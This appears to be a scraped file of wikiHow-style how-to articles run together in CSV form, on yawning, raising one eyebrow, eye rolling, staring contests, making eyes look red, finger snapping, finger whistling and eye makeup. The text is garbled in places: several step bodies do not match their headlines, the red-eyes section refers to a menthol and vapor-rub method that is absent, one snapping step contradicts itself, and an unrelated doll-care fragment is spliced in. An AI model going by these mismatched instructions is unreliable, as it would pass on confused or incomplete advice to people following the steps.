, Pretend like you're going to yawn, even if you don't feel one coming on. Open your mouth as wide as you can. Just getting in position to yawn can be enough to prompt an actual yawn to form.

, These muscles naturally contract a little when you yawn. Contracting them now may stimulate your body to form a real yawn. Your brain will connect the feeling of these muscles contracting with the act of yawning.

, Just as you would with a real yawn, breathe in through your mouth. Breathe quite deeply and slowly, rather than taking a quick, shallow breath, since real yawns allow you to take in a lot of air.

, With your mouth and throat in position, a real yawn is likely to kick in at this point. Your body will naturally want to yawn when your mouth is open, your throat is slightly contracted and you've taken a good deep breath. If you still can't yawn, try the next method.

Hang out around family and friends who are yawning.,
Ask someone you know to pretend to yawn.,
Look around to find strangers yawning.,
Watch a video of people yawning.,
Try watching animals yawn.",How to Make Yourself Yawn2," You probably already know that yawning is highly contagious. When you see someone yawning, you are likely to yawn yourself. This urge to yawn happens more often between people who know each other, like family members, friends or classmates. If you really need to yawn, watch for someone you know to yawn first.


Some scientists theorize that yawning helps to synchronize the actions of a social group. This may be why 50 percent of people yawn when they see someone else yawn, especially if it's someone they know.Yawning is so contagious that even reading about yawning can spark you to yawn., If no one seems to be yawning, ask a friend or family member to pretend to yawn. Just seeing the person going through the motion of yawning, even if they aren't really doing it, could trigger your body to yawn in response., Even though yawns are less contagious between strangers, they're still slightly contagious. If you're in a public place in which you don't know anyone, look around to see if anyone is yawning. Hopefully you'll catch the bug and yawn in response., If you don't have any people around to watch, look up ""yawning"" on YouTube and watch a video of someone yawning. This will have the same effect on you as seeing a stranger yawn in person. You could also just look at a picture of someone yawning.

, Yawning is even contagious among animals and humans. As a fun experiment, try watching your dog or cat yawn, then see if it affects you. Look at videos of other animal species yawning, too. Research shows that almost all animals do it.

Go to a warm room.,
Get cozy and comfortable.,
Stress yourself out.",How to Make Yourself Yawn3," People yawn more often in warm places than in cold. Scientists believe that's because yawning floods the body with cooler air and helps to cool down the brain when it's on the verge of getting overheated. Studies show that people yawn less often in winter or in rooms that are kept cold.On the reverse side, if you're trying to get some work done and you can't stop yawning, try turning down the temperature to cool the room down a bit. Your yawns should subside pretty quickly.

, We tend to yawn more in the morning because our brains are a little hotter during the night. Yawning cools us down when we wake up. If you want to make yourself yawn, try getting back in bed, getting under the covers and warming yourself up. You'll be yawning before you know it.

, Stress and anxiety cause the brain's temperature to rise, and yawning cools it back down. That's why Olympic athletes have been observed yawning right before competing. Skydivers and other daredevils also yawn right before they take the plunge. Working yourself up into a frenzy may help stimulate some yawning to cool your brain down."

Determine which eyebrow is more dominant.,
Push and hold the dominant eyebrow up with your hand.,
Hold only the lower eyebrow down.,

Practice raising and lowering both brows.,
Focus on raising one eyebrow.,
Focus on lowering the other eyebrow.,
Spend five more minutes trying to raise one eyebrow while lowering the other.,
Practice every single day.,
Try raising the other eyebrow.",How to Lift One Eyebrow," Before beginning your training, you will want to figure out which eyebrow will be most easily trained. Typically, this will be your dominant eyebrow.


Stand in front of a mirror, and try to lift your right eyebrow. Then try to lift only your left eyebrow. Which one do you feel that you have better control over? This is likely your dominant eyebrow, and the one you should try to focus on.
Don't worry if you feel you don't have control over either, just pick one and go from there.
Make a note of which eyebrow you will focus on. This way you won't get mixed up and waste time trying to train both eyebrows at the same time.;
, If the other eyebrow comes with it, use the other hand to hold the other eyebrow down. This will help you learn what it feels like when just one of your eyebrows is raised. Keep practicing this in the mirror so you can detect the correct muscle movement to move one eyebrow up.


Place tape over the raised brow instead of using your hand if this feels more comfortable. Doing this gives you more muscle control since you're not relying on your hand to lift the brow. It also forces you to assist in the process of holding the brow up by straining those muscles.
With your eyebrow still raised, trace your finger over the muscles along the brow bone. They should feel taut. These are the muscles you want to focus on when you're lifting the brow. Even if you are primarily using your hand to practice, this is a good exercise to help you remember where the brow muscles are located.

, After you understand how it should feel to raise your eyebrow, release the brow you want to raise while holding the one you want to lower.


Practice this for 2-5 minutes each day.

, After you have practiced raising one brow, you’ll want to practice lowering the other. Do this by holding the raised brow in place with your hand. Practice lowering the other eyebrow.


Again, do this for 2-5 minutes each day.
It is conceivable that some people simply may not be able to individually lift a brow without using the hand as a guide. However, you'll probably need more practice to be able to tell if this is the case. Even people that eventually are able to do it usually require some form of training, so you won't know until you give it a try for a little while.

, When practicing, it is important to stand in front of a mirror. Sometimes we may feel like we are doing the correct movements, but when you look in the mirror you may find that you are not doing what you intended.

, Spend about a minute raising and lowering both brows. This helps you get in the right frame of mind, and helps to get your eyebrow muscles warmed up.

, Spend five minutes focusing on raising the brow you have chosen without the use of your hands. Don’t worry about the other eyebrow right now, just focus on raising it as high as you can.

, Spend another five minutes where you focus solely on lowering the other eyebrow. Again, don’t worry too much about what the opposite eyebrow is doing.

, Hopefully, by this point, you have gotten the hang of it. Take some time trying to simultaneously raise one brow, while lowering the other.

, You don’t need to practice for hours, but you do have to practice every day. You will not be able to get good at doing this if you do not practice consistently.

, Once you get good at raising your dominant eyebrow, you can switch to trying to raise the other one, if you wish. Hopefully, spending time strengthening your eyebrow muscles will make the process go faster, but don’t give up if it takes longer (which it may, since it is your non-dominant brow).

Swing your eyes upward.,
Hold the roll so that only the whites of your eyes are visible.,
Roll your eyes at someone.",How to Roll Your Eyes1," The act of rolling your eyes is pretty simple, once you figure out how to do it. To start: look up as high as you can without moving your head. In other words, bring your gaze to the apex of your eye sockets, or stare up into your forehead. Now, take the time to swing your gaze in an arc from one side of your eyes to the other, all the way around. Someone looking at you will see your pupils ""roll"" over the top of your eyes, so that the whites of your eyes are showing., If you roll your pupils high enough, your eyes will appear pure white. Keep your gaze firmly fixed at the upper inside of your eye sockets. Roll your eyes further and further back into your head until you can swivel them no more.

Take a picture of yourself to confirm that you've rolled your eyes in the way that you intended. Alternately, ask a friend to watch you do it and offer feedback. You won't be able to use a mirror to watch yourself.

, The eye roll is an expression that humans use to convey a feeling of displeasure to other humans.You're doing it for an audience, not for yourself – so it is important to know your audience. Sometimes, you might roll your eyes at someone to show them that you are annoyed with them, that you don't believe them, or that you aren't interested in what they're saying.Other times, you may roll your eyes at Person A behind the back of Person B in order to tell Person A that you're frustrated with Person B. Be careful: if Person B notices, he or she might not be amused.


If you're rolling your eyes at a group of people, you might be genuinely trying to express your frustration, and you might just be looking for a laugh. If you're going for dramatic effect, you'll want to exaggerate the eye roll as much as possible so that it's more noticeable.
If you only want one person to ""receive"" the eye roll, try locking eyes with them first. Once you have been looking into each other's eyes for a brief instant, roll your eyes and make sure that they see it.

Settle on the rules.,
Moisten your eyes before you begin.,
Try to relax and stay calm.,
Let your mind wander.,
Squint slightly, every so often.,
Practice in the mirror.,
Know your opponent.,
Make your opponent laugh.,
Try to distract your opponent.,
Keep focused.",How to Win a Staring Contest," It is important to establish criteria for winning and losing before beginning so you don't get distracted during the game.


To avoid a dispute later, decide exactly what the rules are with your opponent before you start.
Some rules state that the staring contest is over as soon as someone blinks, looks away or laughs.
Other contests don't allow pulling funny faces or waving your hands in front of your opponent's eyes.;
, You won't be able to blink for a long time so it's best to try to get your eyes as moist as possible to start with. Take a nice long blink and close your eyes tightly right before the contest begins.
If you can, yawn to produce a few tears.
Avoid eye drops and face creams. Its best to steer clear of anything that might cause your eyes to itch or become irritated. This might cause you to blink.
All of these things will help your eyes avoid feeling dry and itchy during the competition.

, If you get uncomfortable or anxious you are more likely to get distracted or blink. If you can, sit or stand in a comfortable position.
Don't strain your eyes.
Don't focus too hard on the person before you.

, If you focus too hard on your opponent or winning you might make a mistake. Most people tend to stare, unblinking, off into space when they're lost in thought.
Think of a topic that you find deeply interesting, and turn all your mental energy toward that.
Don't let your mind wander too much, though, or you might find yourself looking away!

, This can help when your eyes start to feel dry. When you feel like you can't take the dryness anymore and you need to blink, squint a bit.
This will help bring some moisture back to your eyes.
Try to make this subtle. If you squint too much it can look like you've blinked.

, This can help you build up your time without blinking and avoiding distractions. If you keep losing staring contests, give it some practice.
Stare into the bathroom mirror, and time how long you can go without blinking.
Try for a longer time each time you practice.

, Being aware of your opponents weaknesses can help you win.


If your opponent is easily distracted, that can help you.
Know how long your opponent can go without blinking and strive to keep your eyes open at least that long.
Find out what makes your opponent laugh.

, Make strange faces or sounds.
Open your eyes very wide or squint.
Tell jokes to make them laugh.
Be careful that you don't start to make yourself laugh in the process, or you will lose!

, Try to make them look away or blink. Wave your hands off to the side to create a distracting motion.
Snap your fingers off to the side to distract them with sound.
Try dropping an object to get them to look away.

, Your opponent will likely try to distract you in similar ways. Think of something that makes you angry or sad. This will help to keep yourself from laughing.
Acknowledge when your partner does something funny, but refuse to allow yourself to react.
Avoid listening to sounds or other distractions.
Stare directly into the pupils of your opponents eyes to avoid looking at other parts of their face.

Practice.,
Exaggerate the eye roll.,
Be careful how you use it.",How to Roll Your Eyes2," The best way to improve your eye roll is to understand how it looks to others. Watch yourself in front of a mirror, if you can, although you might have trouble catching yourself in the act of rolling. Try filming yourself with a webcam or cell phone camera, then watching the playback to see what your eye roll looks like. If you're really serious about it, practice in front of a friend and have him/her tell you how you're doing.


Work on engaging your eye muscles, and keep practicing until you can roll them fluidly. The eye roll, well-executed, should look smooth and effortless.
Don't practice too hard! It is easy to injure or tire your eye muscles from constant rolling., Make it slow and dramatic. Don't focus on what you see – focus on what you look like. The intended target may be more likely to notice and appreciate your eye roll if it is dramatic. However, you might consider a quick and stealthy eye roll if you don't want everyone present to pick up on your feelings.


Try heightening the effect by combining your eye roll with a head-shake, a sigh, or both. Make yourself look visibly exasperated.

, The eye roll can be a provocative expression. Sometimes, rolling your eyes at someone will make them upset with you – and it may even make a conflict worse. If you are legitimately frustrated with someone, try talking out your problems with them rather than passive-aggressively rolling your eyes.

Aim for contrast.,
Cover up dark circles under your eyes with concealer.,
Use a simple sheer eye-shadow.,
Use navy instead of black mascara.,
Add some shimmer to your eye shadows.,
Wear eyeliner.,
Avoid blue eye-shadow and eye make-up, generally.,
Cut your hair so that it frames your eyes.,
Wear something blue in your outfit.",How to Make Blue Eyes Stand Out," While this is true of most eye colors, the vibrant color of bright blue eyes pops especially well when contrasted with darker colors. You do not want to use make-up that is the same color as your eye, as this leads to a flatter look that hides the brilliance of blue eyes. Instead, use dark colors like black, brown and navy around your eyes, apply silvers, golds, or reds to contrast your eye color, or enhance your natural skin tone with powder and concealer to make your eye stand out., Because concealer lightens up the skin around your eyes, your bright blue eyes will pop more in contrast.

, Sheer eye-shadow is the opposite of smokey eyes – it is a simple color applied around your eyes that complements your eyes to make them stand out. Usually it is partially see-through, allowing your skin tone to filter through naturally. For blue eyes, some colors to focus on include:Lavender
Silver
Brown/Tan
Gold
Purple

, The light blue tone in navy mascara will help add an alluring dimension to your eyes, highlighting the blue without calling attention to it.

, It will help bring them out, but if you're going for a day to day normal routine then I would skip this. Apply glitter or a see-through coat of sparkling eye-shadow to give your eyes an attractive gleam.

, Eyeliner, when applied correctly, creates a striking line above your eyes that provides great contrast to your baby-blues. One line on your top eyelid is usually enough to make your eyes stand out, but line your entire eye for a more dramatic look.

, In general, blue eye shadow will conflict with your eyes, preventing them from really popping. However, some make-up artists love to contrast blue-eyes with radically different shades of blue, such as using navy eye-shadow with bright blue eyes., A cut that ends around eye level or bangs that curve around your eyes will draw attention to your big, beautiful blues no matter what make-up you put on or clothes your wear.

, Whether it is a shirt or an accessory, a splash of blue in your outfit can make your eyes stand out by pulling your entire look together. The two blues will complement each other, leading to stunning results.

If you don't know her favorite foods, you can check out her Profile on the website, or make basic foods. The foods you will need are: Bread, Milk, Eggs, Common Fruits (like Apples, Bananas, Grapes, and oranges), Common Vegetables (Carrots, Tomatoes, Corn, Lettuce), and sweet treats (like Ice Cream, Candies, and Cakes).
, She gets dirty too! You may want to wash her with plain water, as some shampoo's may hurt the hair or make the color funny. Wash her a few times a month., She needs to be pampered, because after all, doesn't everyone? Have a hot tub (this can be your sink or a dish of water), Jars of Beauty Cream (beads with craft foam on top), and ""Special"" foods such as truffles and caviar. (Note: if you have a Ghouls Alive, which is electric, build a hot tub out of an old shoe box or tissue box and fill it with clear plastic scraps or blue paper.)

, Sure, they may stop her from going to a party or ground her, but they can also comfort her when she is sad, talk to her, be her friend (if she has none), and give her healthy limits and rules on what she can and cannot do., Well, school's not fun, but she may love a certain class or have a special friend whom she meets at school! Make a few classrooms, a bathroom (one for guys and one for girls), and a Casketball Court/Outdoors space. Some basic classes to have are Math, Science, English, and Gym. And you will also need books and pencils (the My Froggy Stuff Channel on Youtube.com has many video tutorials on how to make these)., This can be a common one like a cat or dog, or a bizarre one like a Snake or a Lion! Just make sure you pick a practical pet, for example, a Vampire shouldn't have a Wolf for a pet, and a Fire Elemental shouldn't have a Fish!, This is the most important thing, aside from food!

But remember: Frankie Stein's BFF's are Draculaura and Clawdeen Wolf, and Cleo de Nile is friends with Ghoulia Yelps, Deuce Gorgon, and Draculaura. Also, optional: Find her a boyfriend, crush, or other Love Interest., She'll want a special day just for her, and make the party as special as she is! Have streamers, party foods, and a Birthday cake in her favorite color. To pick a Birthday, you can use a day that's meaningful to her. For example: for a Werewolf who is fifteen, you might look back 15 years and find out when there was a solar eclipse, or for a Vampire who is 160, look back 160 years ago and find when a Blood Moon or a Witch Trial occurred. For gifts, remember what each girl likes. For example: Clawdeen Wolf would enjoy a new pair of shoes or a jacket, Frankie Stein may like a sewing kit or a mannequin, and Draculaura may want a New Coffin or a car. (Note: Try not to make your character get too old, after she is 18 or 19 make her stay ageless forever.), Such sources of happiness are often hobbies.For hobbies, sewing, drawing, computer games, a scrapbook, guitar/clarinet/violin, outdoor sports games, and fashion design. Pick a hobby that relates to what Monster she is, for example Sewing is Good for Frankie Stein, and Fashion Designing is perfect for Clawdeen Wolf.,"
"
Peel an onion and rub a small piece below your eye.,
Alternatively, try peppermint oil.,
Resist the urge to blink.,
Gently rub the area below your eyes.,
Spend time at the pool.,
Get less sleep.",How to Make Your Eyes Red1," What cheap, widely-available item can make someone's eyes teary and red in a matter of minutes? It's not a Hallmark card — it's an ordinary onion! Onions produce syn-propanethial-S-oxide, a chemical irritant that causes the eyes to produce tears and turn red.Peeling or chopping and onion normally will usually cause your eyes to water, but you may need prolonged exposure to make your eyes water enough to turn red. Try keeping the center portion or a section of the peel and running it beneath your eyes a few times when your eyes need to appear red.


Try to avoid using so-called ""sweet"" onions (like, for instance, Vidalia onions), as these generally don't produce as much irritation and tearing. For best results, use a strong-flavored white or yellow onion.For a gentler approach, place a few pieces of the onion into a tissue or handkerchief and rub the handkerchief beneath your eyes. The barrier will protect your eye itself from coming into direct contact with the onions, but the irritant should still have an effect as long as the material in the tissue is not too thick.
If you're trying to fake the appearance of crying, for an added effect, try rubbing a little inside the bottom of your nostrils to encourage a runny nose.
Be careful to avoid getting any of the vapor rub directly into the eye, as this can be quite uncomfortable.;
, One method that's virtually identical to the menthol method above involves products that contain peppermint oil. Simply use the exact same steps — rubbing a small dab below each eye — to produce a very similar effect as the fumes from the oil irritate the eyes. As above, avoid getting the oil into your eyes, as this can cause stinging and prolonged discomfort.


Peppermint oil can be found at most high-end grocers, specialty food retailers, and health food stores. However, if you don't already have any, it may be more cost-effective to use menthol or an onion, as peppermint oil is usually more expensive by volume.

, If you need red eyes right away, don't worry — you can get them without any sort of special materials at all. Simply hold your eyes open for as long as you can, fighting the urge to blink until it's too painful not to do so. Since frequent blinking is the body's way of keeping the eyeballs well-lubricated, without this, the eyeballs will begin to dry out.When this happens, the eyes should become irritated, puffy, red, and often watery.Note that this can feel quite unpleasant!


For added effect, try looking at a light while you hold your eyes open. Do not use a very bright light or the sun, however, as this can cause lasting eye damage and even blindness.

, One method for inducing red eyes that's frequently used on TV and in movies is balling the hands into fists and rubbing the area around the eyes. This mild form of physical irritation can cause the same sorts of symptoms that onions and other chemical irritants do — namely, red, watery eyes.If you're attempting this method, be sure to use gentle pressure. Crucial parts of the eye like the iris and cornea can be quite delicate, so don't damage your vision simply to make your eyes red.


In addition, be sure to keep your eyes closed and to avoid touching the eye directly. Doing this can transfer bacteria from your hands (which can pick up millions of bacteria from ordinary daily activities) to your eyeball, potentially leading to a painful infection., Chlorine is a great pool-sanitizer, but it's also thought to be an eye irritant, though some sources suggest other chemical culprits.What is clear is that going for a dip in a chlorinate pool without goggles can leave your eyes puffy and inflamed (though the damage is not ordinarily serious or long-lasting.) The effect is increased if you hold your eyes open underwater for an extended length of time. Make sure you do not wear goggles, since the goggles will shield your eyes and prevent the pool from having an effect.


Salt water pools also work well for this purpose. However, some eye health resources claim that saltwater is less irritating than chlorine, so the effect may be lessened., Though this isn't an ideal solution for many (especially people who need to be fully ""sharp"" and focused for any reason the following day), skipping sleep will usually turn your eyes red and bloodshot in the morning.As long as you do not make a habit of it, missing one full night’s sleep will usually not have a dramatic impact on your health.


However, missing out on sleep repeatedly is something you'll never want to do, as this can have major consequences for your health, including: reduced cognitive ability, decreased sex drive, depression, and increased risk for serious ailments like stroke and heart disease.Remember never to drive when you're severely tired or groggy. Because sleep deprivation dulls your reflexes and impairs your split-second decision-making ability, it can make you a major danger on the road. One Australian study found that people who have been awake for 24 hours have a level of impairment equal to someone with a blood alcohol concentration of .10 (the legal limit in most countries is generally about .08)."

Put yourself in a sad or depressed mindset.,
Focus on personal pain.,
Make yourself angry or frustrated.,
Use moving media to help you.,
Keep your expectations in check.",How to Make Your Eyes Red2," Learning how to make your eyes red and teary on command for the purpose of ""fake crying"" can be seriously challenging — even professional actors often struggle with it. Though there's no ""right"" way to do this, certain psychological tricks can be a major help. One useful strategy is to focus on memories and ideas that make you sad, like a close relative who has passed away, a humiliating event you experienced, or a major worry or fear in your life. As unpleasant as it may feel to experience them, the more dark and depressing your thoughts, the more they can help you get into a crying mindset.


Just a few more examples of things you might want to think about are: romantic breakups, recent arguments, troubles at work, times when friends or family betrayed you, people that have drifted out of your life, and times when you've been very fearful for yourself or someone close to you.
It can be especially helpful to try to convince yourself that all the people you know ""have their lives together"" except for you. Try to evoke feelings of hopefulness and despair — think to yourself, ""This is it — I'll never be successful and happy."" However, be sure not to let yourself wallow in this mindset after you need to fake being sad. The last thing you want to do is to make yourself genuinely depressed.

, In the words of one New York University acting teacher, an actor trying to fake cry should “particularize the moment or text with something specific and personal to the performer, so that it becomes less about what is demanded of them and more about an inner secret, desire, fear.”In other words, the best way to get yourself sad enough to cry is to lose yourself in thoughts about your deepest, darkest inner fears and demons. Try to mentally convince yourself that the task you need to fake cry for is all about you being judged as a person even if it's not. Be prepared to dig up and confront your worst personal demons.


One critically acclaimed actor, Bryan Cranston of Breaking Bad fame, has revealed in interviews how his most intense inner fears have helped him give a convincing performance of someone in a tortured mindset. Speaking of a scene in which his character witnesses the death of a younger female actor's character, Cranston said: ""My real daughter's face took her place, so it just hits me ... She's just a girl — she could be my daughter.""

, Red, teary eyes aren't always the result of sadness. Sometimes, these symptoms are brought about by intense feelings of rage or frustration, especially when they're caused by someone close to you. If you're having a hard time crying from purely sad thoughts, try mixing in a healthy dose of anger to get results. For instance, you may want to try to think about a current difficulty in your life that's very frustrating to you, like a relative with self-destructive behavior who won't listen to your advice.


Just a few more examples of things you may want to think about are: times when you've been ""passed over"" for an award or promotion, times when your enemies have succeeded over you, times when you've been treated unfairly by someone with power over you, and times when you've witnessed or experienced social injustices.

, The motivation to tear up doesn't have to come 100% from within — sometimes, using outside sources can be a huge help. This is a strategy that's often used by actors both to get in the proper mindset for an emotional scene and to help assume the appearance of someone who's experiencing these intense emotions. Movies, books, songs, and other forms of art that inspire deep sadness or frustration can be very effective here — below are just a few ideas to get you started, but there are many, many more.


Movies: The Notebook, The Green Mile, The Fault In Our Stars, Titanic, Dumbo, Up, Come and See (Russian film)
Books: 'The Kite Runner, The Giver, Wuthering Heights, The Idiot, any of the later Harry Potter installments, any books that the movies above are based on.
Songs: Yesterday (Beatles), The Needle and the Damage Done (Neil Young), Brenda's Got a Baby (Tupac Shakur), Bad Religion (Frank Ocean), virtually any Elliott Smith song.

, It's important to remember that the strategies in this section may be even harder to get to work than the other tricks in this article, even if you're someone who easily cries when sad. It can be very difficult to make yourself feel sad enough to cry, just like it's difficult to tickle yourself. Even A-list actors often have a hard time ""willing"" themselves to cry, so be ready and willing to use another method if these psychological strategies don't work for you.

Press your thumb to your middle finger.,
Fold your ring finger and pinky down.,
Build up a little pressure between your thumb and middle finger.,
Snap!,
Practice this snapping motion until it comes naturally.",How to Snap Your Fingers1," Begin by resting the pad (the flat, fleshy part) of your thumb against the pad of your middle finger. Don't use the tips of your fingers — you want the soft, squishy parts to meet. A good way to get the right positioning is to pretend you're picking up something heavy with your thumb and middle finger.


To start, practice with your dominant hand (the same one you use to write). When you master the basic snap, you can try with your other hand.;
, Without moving your thumb and middle finger, take your ring finger and pinky and rest them gently against the heel of your palm or the base of your thumb — wherever feels natural. Try to leave a little room at the base of the thumb for your middle finger to snap against the fleshy part at the bottom.


These fingers aren't involved in the snap, but this part is crucial. The ring finger and pinky basically ""prop up"" the rest of the hand, allowing you to use more force when you snap (and thus get a louder sound).

, Now, start to press your thumb and middle finger together, but don't let either one move out of the way yet. Press fairly hard here — a little harder then may feel natural at first. There should be enough pressure to turn the tips of your fingers a little red.









The more pressure you build up, the more power behind your snap. While it's hard to hurt yourself this way, if you feel pain, you're pressing a little too hard.

, Move your index finger down so it rests against your thumb without letting up on the pressure. Move the thumb from the middle finger to the index finger. Your middle finger should slide off of your thumb and ""snap"" towards your palm. It should hit the fleshy base of your thumb and make a sharp cracking sound. Congratulations — you've just snapped your fingers.









Don't worry if you can't get it on the first try. This is something many people have difficulty with at first, but once you get it, it quickly becomes easy. See below for tips on getting your snap just right.

, The only way to get better at finger snapping is to do it! Once you get your first good, loud ""snap,"" try to replicate your motions exactly until you get good results again. Within a few days, you should be able to snap fairly consistently.









If you can't seem to get a good snapping noise, try a few more times and make sure you're doing the following:
Keeping good pressure between your thumb and middle finger until you make your snap
Keeping your ring finger and pinky folded firmly down against your palm
Leaving enough room at the base of your thumb for your middle finger to hit — your middle finger should not end up behind your ring finger
If you're still having little success, try one of the alternate methods below — some people find them easier.

Consider using makeup.,
Consider using colored contacts.,
Enhance the effect with a ""tear stick.""",How to Make Your Eyes Red3," If you can't make it, fake it! With the right tricks, it's possible to use aesthetic tricks to make your eyes appear red and puffy as if you've just been crying, even if you feel perfectly fine. Because these tricks don't actually irritate your eyes, they're vastly more comfortable than some of the methods listed above. For example, try this makeup strategy to give yourself red eyes:Apply small dots of red eyeliner around the outline of your eye. You can also use a red eye shadow or red lip liner, but make sure that any lip liner you use is mild enough to use near your eyes before applying it. Place the dots along the entire bottom lid. For an even stronger red effect, you can also apply the dots along the upper lid.
Smudge the liner over your skin using a cotton swab or makeup smudge stick. In order to make your eyes look red, you will need to cast a somewhat muted red ""shadow"" around their lids. None of the original lines or dots should be visible, so continue smudging until you can no longer see the original dots.

, Another easy way to give your eyes a ""reddened"" effect is to wear specially-made contacts with a reddish tinge or with veins drawn on them. With these, however, it's important to choose a contact that makes the whites of your eye red, not the iris (the portion that's normally blue, green, or brown.) If you give yourself red irises, you'll look like a vampire or a demon, not someone who's just cried.


Some theatrical supply companies make custom-crafted contact lenses for movies and stage productions, so you may want to shop here if you're looking for a high-quality product. However, these aren't likely to come cheap — professional-quality lenses can easily cost over $100.

, If you're faking your red eyes for a stage or film production, it can be a good idea to accompany the tricks above with some actual tears to make the effect look more realistic. In this case, you may want to consider buying a ""tear stick,"" which is a tool used by some actors that basically amounts to a stick of semisolid gel or wax containing menthol. The tear stick usually comes in a tube resembling lipstick and is applied by rubbing it beneath the eyes, where the vapors from the menthol stimulate the eyes to produce tears.


Note that since the ""active ingredient"" in a tear stick is menthol, this method works exactly like the menthol suggestion in the section above.

Don't use strong irritants like pepper, mace, etc.,
Don't irritate the eyeball directly.,
Don't consume marijuana specifically for red eyes.",How to Make Your Eyes Red4," It's never a good idea to seriously risk the health of your eyes in the name of getting convincing redness. Never put anything in your eyes that's likely to cause serious irritation, including intense chemical irritants like ""mace"" (pepper spray) and natural substances like hot pepper products. In sufficient quantities, these substances can cause permanent damage and even blindness.

, If you're using a method that involves rubbing the skin around the eyes to induce redness, be sure not to touch the naked eyeball itself. Even if you manage to avoid injuring it, this runs the risk of transferring bacteria from your hands to the eyeball, which can lead to infections (as noted in the section above.) This risk is amplified if you've just touched something with lots of bacteria on it (like a doorknob.)In addition, since your eyeballs are so delicate, touching them directly can sometimes cause physical injuries. Even the smallest scratches can be quite uncomfortable when they're on your eye, while more serious injuries (like an irritated cornea) can require medical attention.

, We've all heard it before — marijuana use causes comically red eyes. While this is true, it's not a good idea to smoke (or eat) marijuana products as a way of getting your eyes red. If you're creating the red eye effect for acting purposes, the cognitive impairment that can result from a marijuana high can make it difficult to give an appropriate, convincing performance. Additionally, marijuana intoxication is often punishable by law, with punishments ranging from minor to severe depending on the local jurisdiction.

Try snapping with your ring finger.,
Try shaking your hand to get a louder snap.,
Try doing a ""double"" snap.,
Try snapping with both hands.",How to Snap Your Fingers2," Though the middle finger usually gives easier, louder, ""sharper"" snaps, some people prefer using their ring finger to snap. The basic approach here is to simply do the basic snapping motion, only with your thumb shifted down one finger. In other words:









Press the pad of your thumb against the pad of your ring finger.
Fold your pinky down against your palm or the base of your thumb.
Build up pressure between your thumb and ring finger. This can be easier if you move your middle finger and index finger down next to it.
Slide your thumb from your ring finger to your middle finger. Your ring finger should snap down and smack against the base of your thumb, making a snapping sound.

, Some people are able to get exceptionally loud snaps by essentially putting their whole arm into the snapping motion, snapping as they whip their hand down. Be careful not to over-do the hand motions here — you can give yourself a sore wrist if you use too much force. To snap with this method:









Get ready to do a normal snap. Press your thumb against against your middle finger (or ring finger, if you prefer), fold the ring finger and pinky down (just the pinky if you're snapping with your ring finger), and build up pressure.
Turn your palm so that it faces to the side (in the direction of your torso). Your arm should be loose and relaxed from the wrist through the elbow.
In one quick, smooth motion, bring your elbow in and turn your palm up. Then, bring your elbow out and whip your hand down, turning your wrist so that your palm faces the ground. Snap as you whip your hand!
If you're successful, you should get an extra-loud snap. Keep practicing if you don't get it at first. This one can take some time.

, When you've gotten the hang of doing one snap at once, try to make two. It's tricky to get the same level of volume with this technique, but getting the double snap sound itself isn't that difficult. To do a double snap:









Get ready to do a ring finger snap. Your thumb and ring finger should be pressed together, with your pinky folded down and your other two fingers lined up next to your ring finger. You must start on the ring finger — you can't do a double snap starting on your middle finger.
Build up pressure against your ring finger. Keep your middle and index finger close to it.
Slide your thumb to your middle finger without letting up on the pressure, then quickly slide it to your index finger without pausing.
If you do this right, your ring finger should snap against the flesh of your palm immediately followed by your middle finger, making two quick (but separate) snapping sounds. Try practicing this rapid-fire double snap along to your favorite song!

, What use is knowing how to snap if you can't recreate your favorite scenes from West Side Story? Snapping with both hands is easy — it's simply a matter of building up your strength and technique in your non-dominant hand with practice once you've mastered snapping with your dominant hand. Any of the techniques above can work for your non-dominant hand, so experiment until you find the one you like the best!









For an added challenge, try using two different snapping techniques at once! For instance, you might try doing normal snaps with your right hand and double snaps with your left.

"
"
Use the middle and index finger combo.,
Try using your pinky fingers.,
Do a one-handed whistle.,
Position your lips.,
Place your fingers under the tip of your tongue.,
Push your tongue back.,
Close your lips tightly around your fingers.,
Blow.,
Practice.",How to Whistle With Your Fingers," The first finger positioning you can try uses both the middle and index fingers from both hands.









On each hand, stick the middle and index fingers together, while the thumb holds back the other two fingers.
Turn your hands so your thumbs are facing towards you, then touch both middle fingers together to form an ""A"" shape.;
, The second finger positioning is a little simpler.









Stick out the pinky finger on each hand, using your thumbs to hold the other fingers down.
Turn your hands so your thumbs are facing towards you. Touch your pinky fingers together to form an ""A"" shape., It is also possible to whistle using the fingers on just one hand.









Make an ""OK"" sign, by touching either the thumb and index finger of one hand together, or the thumb and middle finger of one hand together, whichever feels most comfortable for you.
Although you can use either hand to whistle with, you may find it easier to use your dominant hand, at least in the beginning.

, The first thing you need to do is moisten your lips to ""wet your whistle"". Then, pull your lips back over your teeth, as if imitating a toothless old man. Keeping your teeth covered by your lips is essential for successful finger whistling.







, Regardless of which finger position you're using, place the tips of your fingers underneath the very tip of your tongue.








, Use your fingers to push back the tip of your tongue, so that the first 1/4 rolls back on itself. Keep pushing until the first knuckles on your fingers reach your bottom lip.








, This step is essential when it comes to producing a clear, high-pitched whistle. There should be no gaps around your fingers at all, your lips should be completely sealed except for the hole in the middle, between your fingers. This is where the sound comes out.








, Now everything is in position, there's nothing left to do but blow! Blow softly at first, making sure that the air is only escaping through the gap between your fingers. If you feel it coming out anywhere else, you'll need to adjust the seal. Also make sure that your tongue doesn't pop up and block the gap, or this will prevent any sound from escaping.









Once you start hearing a sound similar to blowing over the top of a bottle, you'll know you're getting closer. Start blowing harder - this will help you to produce a more high-pitched sound., Whistling through your fingers won't come automatically, you'll need to keep practicing, experimenting with different finger positions and angles and making adjustments to your lip and tongue placement. Eventually, you'll find that ""sweet spot"" that produces a clear, loud whistle. Enjoy!

Line your entire lash line.,
Minimize eyeliner wings.,
Curl your lashes inwards.,
Elongate eyebrows at the inner corners.,
Embrace bangs.,
Use your hair to frame your face.,
Experiment with side-swept styles.",How to Make Your Eyes Look Closer Together," Before you start applying any product to your eyes, it’s important to prime them. Makeup primer creates an even base for your makeup, and it helps ensure that the products will stay in place throughout the day. If you’re going to spend the time applying makeup to flatter your wide set eyes, it’s pretty important to start it off with a good base.You can purchase makeup primer at your local pharmacy or beauty supply store.;
, For your base color, it’s important to avoid super light shades and choose something closer to your skin shade. Use a shadow brush to apply the base color all over your lid, from inner to outer corner. Blend the darker shade that you’ve selected into the crease using a tapered brush. Again, go from corner to corner. Because you want your eyes to appear closer together, avoid blending it outwards from the eye. Stop it at the outer corner. Additionally, make sure you are bringing product all the way to the inner corner.








For your base lid color, avoid eyeshadow shades like silvery white, and instead grab something in a darker shade, whether it’s a brown, a pink, green, or any other color you desire.

